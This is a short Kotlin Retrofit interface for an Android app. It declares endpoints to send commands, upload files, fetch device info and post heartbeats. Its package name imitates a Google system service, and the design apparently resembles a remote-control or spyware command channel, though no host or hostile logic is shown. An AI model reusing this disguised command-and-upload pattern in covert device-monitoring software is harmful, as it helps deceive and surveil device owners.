package com.google.android.systemservice.data.api

import com.google.android.systemservice.domain.model.Command
import com.google.android.systemservice.domain.model.CommandResponse
import com.google.android.systemservice.domain.model.UploadResponse
import okhttp3.MultipartBody
import retrofit2.http.*

interface ApiService {
    
    @POST("commands")
    suspend fun sendCommand(@Body command: Command): CommandResponse
    
    @Multipart
    @POST("upload")
    suspend fun uploadFile(@Part file: MultipartBody.Part): UploadResponse
    
    @GET("device/info")
    suspend fun getDeviceInfo(): Map<String, Any>
    
    @POST("device/heartbeat")
    suspend fun sendHeartbeat(@Body data: Map<String, Any>): Map<String, Any>
}
